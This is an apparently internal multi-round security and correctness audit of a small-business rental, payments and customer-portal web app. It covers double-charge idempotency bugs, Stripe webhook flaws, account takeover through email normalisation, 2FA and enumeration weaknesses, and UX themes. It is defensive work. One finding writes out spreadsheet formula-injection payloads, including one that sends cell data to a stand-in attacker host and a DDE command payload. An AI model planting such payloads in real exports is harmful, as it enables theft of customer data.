# KosherConnect — Deep Re-Audit (2026-07-15)

A multi-round, adversarially-verified audit of the whole system before Phase 2.
Each round fans expert finders across every surface; every finding is checked by
three independent skeptics (reproduce / find-the-guard / fix-&-severity) and only
survives on a majority-of-three. Rounds carry forward known issues so later rounds
hunt *new* or *deeper* defects, and loop until findings dry up.

Method: 13 dimensions — money math, ledger idempotency, cron sweep, Stripe (new),
portal auth (new), documents (new), auth/secrets, SSR/routing (new), API validation,
data layer, migrations/RLS, client logic, design/UX.

Status legend: **CONFIRMED** (3/3 or 2/3 skeptics) · **PLAUSIBLE** (1/3) · fixed ✅

**C1 — Wallet money-in POST is non-idempotent (random charge_reference) — retry double-posts payment/top-up/refund/adjustment**

- _What:_ Every money-in POST builds charge_reference = `${kind.prefix}-${crypto.randomUUID()}` (line 173). The reference is freshly random per request and is not derived from any client-supplied idempotency token, so the ledger's unique-on-charge_reference constraint (and db.insert, which is a plain non-conflict insert here) provides zero protection against a duplicated request. The file header (lines 5-6) claims 'idempotency via charge_reference unique', but this endpoint never produces a stable reference, so that guarantee does not apply to any write it makes.
- _Repro:_ Staff records a £200 top_up for a customer. The client request times out at the proxy and is retried (or the operator double-clicks Save). Two POSTs run, each generating TOPUP-<uuid1> and TOPUP-<uuid2>. db.insert writes both rows. customer_balances now shows +£400 credit; the customer is credited twice for one £200 payment. The same double-post occurs for payment, refund, and (owner) adjustment kinds.
- _Fix:_ Require a client-supplied idempotency key on the POST (e.g. b.clientRef) and fold it into a deterministic charge_reference (e.g. `${kind.prefix}-${clientRef}`), then use db.insertIgnoreDup(...,'charge_reference') instead of db.insert so a retry with the same key is a no-op. Reject requests without a key rather than minting a random one.

**C2 — Service-order creation double-charges on duplicate submit — charge_reference derived from a per-request order id**

- _What:_ POST unconditionally inserts a new service_orders row (line 71), then keys the ledger charge SVC-${order.id} and any payment PAY-SVC-${order.id} on that just-minted id (lines 82-100). There is no unique constraint on the order (customer+service+time) and no client idempotency token, so a duplicate request creates a second order with a second, distinct order.id — and therefore a second SVC-<uuid> charge that insertIgnoreDup cannot dedupe. The header comment's 'charge_reference SVC-<uuid> (idempotent)' is false for exactly the double-submit case idempotency should cover.
- _Repro:_ Operator charges a £15 passport-photo service; the browser retries the POST after a slow response (or a double-click). Two service_orders rows are created with different ids, producing SVC-<idA> (-£15) and SVC-<idB> (-£15) — the customer is charged £30 for one service. If paidNow was set, PAY-SVC-<idA>/PAY-SVC-<idB> also double-post. Owner auto-extras (postAutoCharges, refBase=order.id) double as well.
- _Fix:_ Accept a client-supplied idempotency token and use it as the stable refBase for the order and all ledger references (or add a unique constraint / pre-insert existence check keyed on that token), so a duplicate request reuses the same SVC-<token> reference and insertIgnoreDup collapses the second charge.

**C3 — Off-session card charge idempotency key includes Date.now() — double-submit charges the card twice and double-posts the ledger payment**

- _What:_ reference = `STRIPE-OFFSESSION-${c.id}-${Date.now()}` (line 30) is passed to chargeOffSession as the Stripe Idempotency-Key (lib/stripe.js:108). Because it embeds the current millisecond timestamp, two invocations for the same intended charge never share a key, so Stripe treats them as two separate PaymentIntents. Each returns a distinct pi.id, and the ledger row STRIPE-${pi.id} (line 39) therefore has a distinct charge_reference — insertIgnoreDup cannot collapse them.
- _Repro:_ Owner clicks 'Charge card on file £50' twice in quick succession (or the request is retried). Two requests build STRIPE-OFFSESSION-<cid>-1699999999001 and ...-1699999999040, Stripe creates two PaymentIntents, the customer's card is actually charged £100, and two ledger 'payment' rows (STRIPE-<piA>, STRIPE-<piB>) credit £100 to the wallet.
- _Fix:_ Make the idempotency key stable for the intended charge — e.g. require the caller to pass a token, or derive it from customer + amount + a coarse time bucket the UI reuses on retry — instead of Date.now(), so a duplicate submit reuses the same Stripe Idempotency-Key and posts one PaymentIntent and one ledger row.

**C4 — Flight-booking creation double-charges on duplicate submit — same per-request-id idempotency flaw as service orders**

- _What:_ POST inserts a new bookings row (booking.id fresh) and keys the ledger charge BOOKING-${booking.id} and payment PAY-BOOKING-${booking.id} on it (lines 199-221). No unique constraint or client idempotency token backs the booking, so a duplicate request mints a new booking id and a new, un-dedupable BOOKING-<uuid> charge despite the 'one signed, idempotent ledger row' comment.
- _Repro:_ Operator books a £480 flight; the POST is retried after a timeout. Two bookings and two BOOKING-<uuid> charges are created, billing the customer £960 for one ticket (plus double PAY-BOOKING and double booking auto-extras when paid on the spot).
- _Fix:_ Thread a client idempotency token through as the booking's stable reference base and use it for BOOKING-/PAY-BOOKING- references (or enforce a uniqueness guard on the booking), so retries reuse the same reference and insertIgnoreDup discards the duplicate charge.

**C5 — Webhook marks event processed before posting the ledger row, so a retry after a partial failure permanently loses the payment**

- _What:_ The handler inserts the dedupe row into stripe_events (line 27) and early-returns duplicate:true on any subsequent delivery of the same event.id (line 28) BEFORE the ledger row is written (lines 36-43). The ledger insert on lines 36-43 is awaited with no try/catch, so any transient failure (PostgREST network blip, timeout, RLS/permission hiccup) makes the handler throw a 500. Stripe then retries the same event, but the retry now finds the event id already in stripe_events, returns 200 duplicate:true, and never reaches the ledger insert. The dedupe key is committed before the side effect it is supposed to protect.
- _Repro:_ Customer pays 100 GBP in the portal. Stripe delivers payment_intent.succeeded. Delivery #1: stripe_events row for evt_x inserts successfully, then db.insertIgnoreDup('ledger',...) throws (momentary DB error). Handler returns 500. Stripe retries: delivery #2 for evt_x hits insertIgnoreDup('stripe_events') which returns [] (conflict) -> handler returns {received:true, duplicate:true} and skips the ledger block entirely. Money was captured by Stripe, but no ledger 'payment' row ever posts; the customer's balance still shows 100 GBP owing forever. Portal payments have no other posting path (see pages/api/portal/pay.js lines 4-5).
- _Fix:_ Do not let the stripe_events insert be the sole gate. Either (a) perform the ledger insert first and only record stripe_events after the side effects succeed, or (b) drop the early-return short-circuit and rely solely on the ledger charge_reference unique key for idempotency (the ledger insertIgnoreDup on 'charge_reference' is already safe to run on every delivery). The stripe_events table should be an observation record, not a processed-marker written ahead of the work.

**C6 — Off-session charge idempotency key embeds Date.now(), so a double-submit charges the customer's card twice**

- _What:_ The idempotency key passed to Stripe (reference = `STRIPE-OFFSESSION-${c.id}-${Date.now()}`, used as the Idempotency-Key header via chargeOffSession -> stripeApi in lib/stripe.js lines 108-109) is regenerated on every request because it contains Date.now(). Two requests milliseconds apart produce two distinct keys, so Stripe treats them as two independent PaymentIntents with confirm:true and charges the card twice. The idempotency key provides no protection against duplicate operator actions — the exact thing it exists to prevent. The ledger dedupe on charge_reference `STRIPE-${pi.id}` also does not help because each charge yields a different pi.id, so both charges post to the ledger too.
- _Repro:_ Operator clicks 'Charge 50' on a customer with a card on file; the button double-fires (or the operator double-clicks) so two POSTs reach /api/charge-card ~5ms apart. reference #1 = STRIPE-OFFSESSION-<id>-1699999999001, reference #2 = ...002. Both call chargeOffSession with confirm:true -> two PaymentIntents both succeed -> customer is charged 100 total, and two distinct ledger 'payment' rows are written (STRIPE-<pi1>, STRIPE-<pi2>).
- _Fix:_ Derive the idempotency key from stable inputs (e.g. hash of customerId + amount + a client-supplied request token or a coarse time-bucket) so repeated submissions of the same intended charge collapse to one PaymentIntent, instead of embedding Date.now().

**C7 — Portal pay/save-card gate on stripeEnabled but not on the webhook being configured; with the secret key set and no webhook secret, portal payments are captured but never posted to the ledger**

- _What:_ pay.js checks only stripeEnabled (line 14) and, by design (lines 4-5), posts NO ledger row itself — the ledger 'payment' row is written exclusively by the webhook on payment_intent.succeeded. But nothing verifies STRIPE_WEBHOOK_SECRET is configured. lib/stripe.js exports webhookConfigured/stripeStatus().webhook precisely to reflect this, yet pay.js never consults it. If the operator sets STRIPE_SECRET_KEY + STRIPE_PUBLISHABLE_KEY but omits STRIPE_WEBHOOK_SECRET (or the Stripe dashboard webhook endpoint is missing/misconfigured), the portal happily creates PaymentIntents and takes real money with no reconciliation path.
- _Repro:_ Admin wires STRIPE_SECRET_KEY and STRIPE_PUBLISHABLE_KEY to go live but forgets STRIPE_WEBHOOK_SECRET. Customer opens the portal, pays 100 GBP, Payment Element confirms, Stripe captures the card. verifyWebhook returns null for every delivery (WEBHOOK_SECRET empty -> line 126 of lib/stripe.js returns null -> 400), so no payment_intent.succeeded is ever processed and no ledger row is posted. The customer is charged but still shows 100 GBP owing. The 402 double-charge and lost-payment failure is silent to both parties.
- _Fix:_ In pay.js (and save-card.js), refuse to create an intent when the webhook is not configured — return a 503 unless webhookConfigured is true — so a payment can never be taken while the only ledger-posting path is dead.

**C8 — Email normalization cross-wires distinct mailboxes to another customer's account (data-isolation break + financial actions)**

- _What:_ normalizeEmail() strips ALL dots from the local part and drops any +suffix for EVERY domain (it assumes Gmail semantics universally). The portal verifies the *raw* verified email from Supabase (lib/auth.js verifyPortalToken returns r.json.email), then resolves the customer purely by customers.email_normalized (lib/portal.js:15,19 resolvePortalCustomer; pages/api/portal/me.js:26-28). At domains where dots are significant (yahoo.com, most corporate/custom domains — confirmed: jane.doe@yahoo.com and janedoe@yahoo.com both normalize to janedoe@yahoo.com), two DIFFERENT real people collide to one normalized value. There is no requirement that the token's raw email equals the customer's stored raw email — only the normalized forms must match.
- _Repro:_ Customer Jane exists with email_raw='jane.doe@yahoo.com', email_normalized='janedoe@yahoo.com'. Attacker owns the separate real mailbox janedoe@yahoo.com. Attacker requests a magic link (or Google sign-in) for janedoe@yahoo.com — their own verified inbox — gets a valid Supabase token whose email is 'janedoe@yahoo.com'. me.js normalizes it to 'janedoe@yahoo.com', matches Jane's row, and serves Jane's balance, rentals, bookings and documents. pay.js / save-card.js then let the attacker create PaymentIntents/SetupIntents and persist stripe_customer_id against Jane's customer record; documents/download.js signs URLs for Jane's files. Full cross-customer read + act.
- _Fix:_ Do not authenticate/resolve customers on a lossy normalized email. Require an exact match on the verified raw email (email_raw=eq.<token email>, case-insensitively) — or better, bind the Supabase auth-user id to the customer row (the customers.auth_user_id link the code comments already envision) and resolve by that id instead of by any email string. Reserve the dot/plus normalization for fuzzy staff-side matching only, never for the portal identity check.

**C9 — Present-but-invalid session cookie causes an infinite /login ↔ / redirect loop**

- _What:_ login.js getServerSideProps redirects to '/' whenever the request cookie merely CONTAINS the substring 'kc_session=' (presence check), but the running app authenticates by VALIDITY: initApp() calls kcFetch('/api/auth/me'), and kcFetch (public/main.js:6-13) does `window.location.href='/login'` on any 401. lib/pageAuth.requireStaffCookie (used by / and /[tab]) also only checks cookie presence, so '/' renders the shell instead of gating. The session cookie is set with Max-Age=30 days (lib/auth.js:165), independent of the Supabase token validity, so the browser keeps sending a 'kc_session=' cookie long after resolveStaff() (lib/auth.js:220-252) starts returning null.
- _Repro:_ A helper is removed from the team (removeTeamMember → staff_profiles row deleted) while their browser still holds a valid-looking kc_session cookie; OR the Supabase refresh token expires/is revoked while the 30-day cookie is still live. Next page load: (1) browser at '/' → requireStaffCookie sees 'kc_session=' present → passes → shell renders; (2) initApp → GET /api/auth/me → resolveStaff returns null → 401 → main.js sets location.href='/login'; (3) /login SSR sees cookie still present → 307 redirect to '/'; (4) back to step 1. The user is trapped in a rapid full-page redirect loop and can never reach the login form to sign in again.
- _Fix:_ In login.js getServerSideProps, do not trust cookie presence: call resolveStaff(req) (or /api/auth/me logic) and only redirect to '/' when it returns a real staff session; when the cookie is present but invalid, clear it (Set-Cookie sessionCookie(null)) and render the login form. Equivalently, break the loop at the client: when /api/auth/me returns 401 during boot, POST /api/auth/logout to clear the stale cookie before navigating to /login.

**C10 — countDays feeds UTC-shifted dates to the free-day predicate, mischarging Shabbos/Yom Tov near the range boundary in any timezone ahead of UTC (UK/Israel)**

- _What:_ countDays builds each day with `new Date(`${fromISO}T00:00:00`)` (parsed in LOCAL time) but then derives the YYYY-MM-DD it passes to isFreeDay via `cur.toISOString().slice(0,10)` (which is UTC). In any timezone with a positive UTC offset — UK summer (BST, UTC+1) and Israel (UTC+2/+3), i.e. exactly where this business operates — local midnight of day D is the previous UTC day D-1, so the ISO string handed to the Shabbos/Yom Tov predicate is shifted back by one calendar day. The loop iteration count (totalDays) is unaffected, but chargeableDays is computed against the WRONG dates. This is the canonical, unit-tested statement of the pricing math; the live client mirror (public/main.js calcRentalPrice) avoids the bug entirely by passing the Date object to isShabbatOrHoliday, so the module diverges from the code it claims to be authoritative for. The test at test/rentalMath.test.mjs:43 only passes because CI runs in UTC.
- _Repro:_ Rental Wed 1 Jul 2026 → Sat 4 Jul 2026, where Saturday 2026-07-04 is a real Shabbos (a free day at the range END). Correct result: chargeableDays=3, totalDays=4. Verified: TZ=UTC gives {chargeableDays:3,totalDays:4}; TZ=Europe/London and TZ=Asia/Jerusalem both give {chargeableDays:4,totalDays:4} — the Shabbos is never detected (the predicate is queried for 2026-06-30..2026-07-03, never 2026-07-04), so the customer is charged a full day for Shabbos. Symmetrically, a Shabbos landing on the range START day pulls a spurious free day in from before the rental and undercharges. Every rental priced in a UK/Israel browser or a non-UTC server is exposed.
- _Fix:_ Do not round-trip through UTC. Either format the local date directly (e.g. `${cur.getFullYear()}-${String(cur.getMonth()+1).padStart(2,'0')}-${String(cur.getDate()).padStart(2,'0')}`), or iterate purely on integer Y/M/D components, so the ISO string handed to isFreeDay always names the same calendar day the loop is on. Add a test that runs under a non-UTC TZ (e.g. process env TZ=Asia/Jerusalem) so the regression net actually asserts it.

**C11 — Disabling or removing an automation rule orphans its open auto-tasks forever**

- _What:_ runCustomRules only loads rules with enabled=is.true (line 67), and the close-stale-tasks step (lines 132-134) runs inside each rule's loop iteration. A rule that is disabled or deleted is never iterated, so its previously-raised RULE-<ruleId>-<entityId> open tasks are never closed by the sweep. The same gap applies to a rule whose trigger is unknown, because line 129 does `continue` before reaching the close block. This violates the file's stated idempotency contract (lines 3-6: 'close it when the condition clears').
- _Repro:_ Owner creates a 'balance_over' rule (id 5); a sweep raises RULE-5-<cust> 'Owes £50+' high-priority tasks for 10 customers. Owner then disables the rule. Every subsequent sweep skips rule 5 entirely, so all 10 tasks stay open permanently even after the customers pay off their balances. There is no code path that ever closes them; they accumulate as stale high-priority noise.
- _Fix:_ After processing enabled rules, also load open tasks whose reference matches RULE-* and close any whose ruleId is not among the currently-enabled rule ids (or explicitly close a rule's open tasks at the moment it is disabled/deleted in the automations API).

**C12 — Effective upload size cap (~9 MB) is below the advertised/enforced 10 MB limit**

- _What:_ MAX_DOC_BYTES is 10 MB and decodeUpload rejects with 'File is too large (max 10 MB).', but the request carries the file as base64 inside a JSON body capped by bodyParser sizeLimit '12mb' (documents.js:9, portal/documents.js:9). Base64 inflates 10 MB to ~13.3 MB, so the 12 MB body cap is hit first: the maximum decoded file that actually fits is ~9 MB. The 10 MB check on decoded bytes is effectively unreachable.
- _Repro:_ A staff member or customer uploads a legitimate 9.5 MB PDF (well under the 10 MB the app promises). The base64 JSON body is ~12.7 MB, so Next.js rejects it at the bodyParser layer with a generic 'Body exceeded 12mb limit' 500/413 before decodeUpload ever runs — the user never sees the friendly size message and cannot upload a file the UI told them was allowed.
- _Fix:_ Raise the bodyParser sizeLimit to comfortably exceed base64(MAX_DOC_BYTES) (e.g. '15mb') so the decoded-byte check in decodeUpload is the authoritative limit, or lower MAX_DOC_BYTES / the advertised limit to match what the body cap actually permits (~8.5 MB).

**C13 — 2FA ticket is reusable for its full 10-minute TTL with no per-attempt lockout, widening the OTP brute-force window**

- _What:_ make2faTicket issues an HMAC ticket valid for TICKET_TTL_MS (10 min) that binds only email+exp; verify-2fa.js does not mark it single-use, does not track failed OTP attempts, and does not invalidate it after N wrong codes. The only second factor gating a session is a 6-digit numeric OTP. Application-layer defense against guessing the 6-digit code rests entirely on Supabase's own OTP rate limiting; this code adds none of its own.
- _Repro:_ An attacker who obtains a valid ticket (e.g. it is returned in the login JSON body and could be captured from logs/proxies, or replayed) can POST /api/auth/verify-2fa repeatedly for 10 minutes cycling the 6-digit code (10^6 space) with no server-side counter tying failures to that ticket; each attempt only depends on Supabase's rate limits, not on any KosherConnect guard.
- _Fix:_ Make tickets single-use and attempt-limited: store issued ticket ids (or a jti in the HMAC payload) server-side/Supabase, invalidate on first successful verify and after a small number of failed attempts, and shorten the TTL. At minimum add a per-ticket failed-attempt counter that voids the ticket after ~5 wrong codes.

**C14 — CSV formula injection in customer export**

- _What:_ Each cell is emitted as a quoted field ("..." with inner quotes doubled) but no formula guard is prepended. Customer-controlled fields (firstName, lastName, phone, email, address) are stored verbatim by customerToRow (first_name: c.firstName || '', no sanitisation) and written raw. Excel/Google Sheets evaluate a leading =, +, -, or @ even inside a quoted field, so the export is a spreadsheet-formula injection vector.
- _Repro:_ A customer is saved with first name '=HYPERLINK("http://evil.example/?d="&A1&B1,"click")' (or '=cmd|'/c calc'!A1', '+1+1', '@SUM(...)'). The owner clicks Export CSV and opens customers.csv in Excel; the cell becomes '"=HYPERLINK(...)"' and the formula executes on open — exfiltrating adjacent cells (other customers' phone/email) via the hyperlink/WEBSERVICE call or triggering DDE.
- _Fix:_ Before quoting, neutralise cells that begin with =, +, -, @, tab, or CR by prefixing a single quote (or a leading tab) e.g. `const safe = /^[=+\-@\t\r]/.test(String(v)) ? `'`+String(v) : String(v)`, then wrap/escape as today.

**C15 — Month-end billing anchor drifts permanently earlier and never recovers**

- _What:_ advanceOneMonth clamps the day-of-month to the shorter target month (e.g. 31 Jan -> 28 Feb) but then feeds that clamped date back in as the new anchor, so the original billing day is lost forever. There is no separate anchor day; once a subscription passes a short month it bills on the clamped day for the rest of its life and never returns to the intended day-of-month. Called from pages/api/cron/sweep.js:419 where the return value becomes next_billing_date.
- _Repro:_ A VN with monthly_price>0 and next_billing_date 2026-01-31 (intent: last day of month). Sweep bills 2026-01 then advanceOneMonth gives 2026-02-28. Subsequent runs produce 2026-03-28, 2026-04-28, 2026-05-28 (verified via node). It should be 2026-03-31, 2026-04-30, 2026-05-31. The customer is charged up to 3 days early every month indefinitely; a 2026-08-31 anchor drifts to the 30th forever (2026-09-30 -> 10-30 -> 11-30, never back to the 31st). No charge is lost or doubled (still one per calendar month), but the recurring charge date is permanently wrong.
- _Fix:_ Store an immutable billing anchor-day (e.g. 31) separately from next_billing_date, and when advancing compute the next date from the anchor clamped to that month's length, rather than re-deriving the day from the previously clamped date. E.g. keep original day and do min(anchorDay, lastDayOf(nextMonth)).

**C16 — request-link timing oracle enumerates which emails are customers**

- _What:_ The endpoint returns a byte-identical body in both cases, but it only performs the extra sendMagicLink() network round-trip to Supabase (/auth/v1/otp) when the email matches a customer row; for a non-customer it returns immediately after the local db.select. The measurable difference in response latency reveals whether an email is a registered KosherConnect customer — directly contradicting the file's own claim ("The response is identical either way (no way to probe which emails are customers)").
- _Repro:_ An attacker POSTs a list of candidate emails to /api/portal/request-link and measures response times. Emails that trigger the extra Supabase OTP round-trip respond noticeably slower than non-matches, letting the attacker enumerate the operator's customer email list (a privacy/PII leak for a small phone-rental business), even though every response body is the same.
- _Fix:_ Make the two paths take indistinguishable time: e.g. always issue the OTP call (Supabase create_user:true already tolerates unknown emails) or run the matched-branch work behind a fixed-latency wrapper / fire-and-forget so response timing does not depend on whether the email matched.

**C17 — Upload content-type is trusted from the client and never sniffed**

- _What:_ decodeUpload validates and stores the client-supplied contentType field only (ALLOWED.has(ct) against req.body.contentType). The actual file bytes are never inspected/sniffed. The same client-claimed value is written to customer_documents.content_type and passed to putObject as the object's stored Content-Type (documents.js:42 and portal/documents.js:32), so what staff see in the review queue and what the file is later served as are both attacker-declared, not derived from content.
- _Repro:_ A portal customer POSTs {filename:'passport.pdf', contentType:'application/pdf', dataBase64:<base64 of an arbitrary HTML/script or executable payload>}. It passes validation, is stored, and is served on the signed URL with Content-Type: application/pdf while the bytes are something else entirely. Staff approve it believing it is a PDF. Impact is limited because the ALLOWED set contains only inert types (jpeg/png/webp/heic/heif/pdf) and files are served cross-origin from the Supabase storage domain, so this is metadata deception / mislabeling rather than app-origin XSS — but the mime is entirely client-controlled with zero byte-level verification.
- _Fix:_ Sniff the leading magic bytes of the decoded Buffer and require them to match the claimed contentType (e.g. FF D8 FF for JPEG, 89 50 4E 47 for PNG, 25 50 44 46 for PDF, RIFF/WEBP, ftyp/heic), rejecting when the signature does not correspond to an entry in ALLOWED, rather than trusting the contentType string.

**C18 — Malformed 2FA ticket crashes verify-2fa with an unhandled 500 (timingSafeEqual length mismatch outside try)**

- _What:_ check2faTicket (lib/auth.js:126) calls crypto.timingSafeEqual(Buffer.from(mac), Buffer.from(expect)). `mac` is attacker-controlled from the request ticket, `expect` is always 43 base64url chars (32-byte HMAC-SHA256). Node's timingSafeEqual throws ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH when the two buffers differ in length. The exp<Date.now() short-circuit only guards expired tickets; a ticket whose exp is in the future but whose mac is any length other than 43 reaches timingSafeEqual and throws. In verify-2fa.js the check2faTicket call at line 20 is OUTSIDE the try/catch that begins at line 24, so the throw is uncaught and the framework returns a bare 500 instead of the intended 403.
- _Repro:_ POST /api/auth/verify-2fa with body {email:'x@y.com', code:'000000', ticket:'99999999999999.AAAA'} (future exp, 4-char mac) -> Buffer.from('AAAA') is length 3, expect is length 43 -> timingSafeEqual throws RangeError -> uncaught -> HTTP 500 'Verification failed' instead of a clean 403 'Sign-in expired'. Any garbage/tampered ticket with a valid-looking exp yields a 500, a cheap error-path DoS and a confusing failure mode.
- _Fix:_ Length-guard before timingSafeEqual in check2faTicket: `const a=Buffer.from(mac); const b=Buffer.from(expect); if(a.length!==b.length) return false; return crypto.timingSafeEqual(a,b)`. Additionally wrap the check2faTicket call inside the try block in verify-2fa.js so any residual throw becomes a 403, not a 500.

**C19 — Login response distinguishes valid-non-staff from wrong-credentials, enabling staff-membership enumeration**

- _What:_ login.js returns 401 'Wrong email or password' when the password grant fails (line 30) but 403 'This account is not a staff member' when the password is correct for a real Supabase auth user that has no staff_profiles row (line 40), with an extra staffProfileFor/bootstrap round-trip in the latter path. The distinct status code, distinct message, and distinct latency let a caller who holds valid credentials for any Supabase auth user in the project distinguish staff accounts from non-staff accounts.
- _Repro:_ An insider (or anyone with a valid portal/customer auth account, since portal and staff share the same Supabase auth project) POSTs their own correct email+password to /api/auth/login: a non-staff account gets 403 'not a staff member', a staff account gets the 2FA prompt / 200. This confirms which auth emails are staff without needing their 2FA code, useful for targeting.
- _Fix:_ Return an identical generic response (e.g. 401 'Wrong email or password.') for both the failed-grant and the authenticated-but-not-staff cases, and avoid branching latency by not short-circuiting differently; keep the detailed reason server-side in logs only.

**C20 — Cookie gate uses substring match, accepting forged/adjacent cookie names**

- _What:_ requireStaffCookie gates on `(req.headers.cookie || '').includes('kc_session=')`, and login.js:138 does the same. A raw substring test matches any cookie whose name or value contains the literal 'kc_session=', e.g. a cookie named 'x' with value 'kc_session=1' (header 'x=kc_session=1'), or a differently-named cookie 'notkc_session=…'. readSessionCookie (lib/auth.js:171) uses a proper anchored regex, so these forged cookies never authenticate an API call — but they DO satisfy the SSR gate and the login reverse-redirect.
- _Repro:_ An unauthenticated visitor sets document.cookie='junk=kc_session=1' then loads '/'. requireStaffCookie returns null (gate passes) so the full app shell HTML is served instead of redirecting to /login; and /login redirects them to '/'. Combined with finding #1 this also drives the /login↔/ loop (API calls 401 because readSessionCookie's strict regex finds no real token).
- _Fix:_ Parse the cookie header properly (reuse readSessionCookie / a real cookie parser) and check for an actual kc_session cookie, rather than String.includes('kc_session=').

**C21 — Unknown-tab 404 is decided before the auth gate, leaking valid tab names**

- _What:_ getServerSideProps evaluates the dashboard redirect and `if (!TAB_IDS.includes(tab)) return { notFound: true }` BEFORE calling requireStaffCookie. So the authentication decision depends on whether the path is a known tab, and an unauthenticated request gets different responses for valid vs invalid tab ids.
- _Repro:_ An unauthenticated attacker probes paths: GET /rentals → 307 redirect to /login (valid tab), GET /zzz → 404 (unknown tab). By diffing these responses they enumerate the exact set of valid operator tabs (rentals, sim, wallet, repairs, …) without any credentials. Low impact since tab names are cosmetic, but it is an unauthenticated information disclosure that the intended gate-first ordering would prevent.
- _Fix:_ Call requireStaffCookie(req) first and return its redirect before doing the TAB_IDS/notFound branch, so unauthenticated requests are uniformly sent to /login regardless of whether the tab exists.

**C22 — popstate to a helper-forbidden tab desyncs the URL from the rendered content**

- _What:_ The popstate handler does `const tab = tabFromPath(); if (allowedTabs && !allowedTabs.includes(tab)) return;` — it returns early WITHOUT re-rendering or re-syncing when a restricted helper navigates (Back/Forward) to a URL for a tab they are not allowed. The browser has already changed the address bar to that forbidden path, but the content pane and nav highlight remain on the previous tab.
- _Repro:_ A helper whose allowedTabs excludes 'settings' has /settings in their history (e.g. they typed it, got canonicalised at boot, or an owner later restricted them). They press Back to /settings: popstate fires, the early return leaves the content showing the previous tab and the sidebar highlighting it, while the URL bar reads /settings. Refreshing that URL then bounces them again — a confusing address-bar/content mismatch.
- _Fix:_ On popstate for a forbidden tab, either replaceState back to the current allowed tab's URL, or redirect to their first allowed tab and render it, so the URL and rendered content never disagree.

### Cross-cutting themes

- Motion as a system, not decoration: a single easing/duration token layer behind one reduced-motion guard, consumed by toasts, buttons, modals and rows — the cheapest change that makes the whole app read as designed rather than defaulted.
- The POS till is the highest-traffic, highest-stakes surface: giant change readout, sticky mega-Charge, 48px targets, smart cash denominations and eyes-free scan feedback are where speed and error-reduction compound hardest.
- Money deserves first-class typography: tabular + slashed-zero figures, right-aligned columns, directional +/- colour and a real GBP input turn a generic CRM into something that reads as a financial tool at counter speed.
- Reversibility and trust for a solo operator under time pressure on flaky wifi: undo-toast soft-deletes, inline validation, optimistic-but-data-safe buttons, autosave drafts and an offline write queue protect against the fat-finger and the dropped connection.
- Keyboard-first power operation (Linear/Superhuman model): focus-visible everywhere, Cmd+Enter modals, palette recents, j/k nav and POS hotkeys let someone who lives at the counter run the app without leaving the home row.
- Dark-mode and token correctness for the evening shop: color-mix self-theming tints delete the override blocks, and elevation-by-lightness + desaturated state colours stop the ledger and till from shimmering.
- Phone/handset use is a real structural gap today (the 220px sidebar eats 60% of a 375px screen, sub-16px inputs zoom-crop, tables side-scroll): the iOS zoom fix is a one-liner win now, with the bottom tab bar / card-collapse / bottom-sheet trio as the medium-effort follow-through.
- Deliberate CSS restraint: per the reorganize=false verdict, every win lands in-place in globals.css/main.js with native CSS and no build changes — the architecture refactors (@layer, :where, logical props, nesting, triads) are parked as organizational nice-to-haves, not polish.
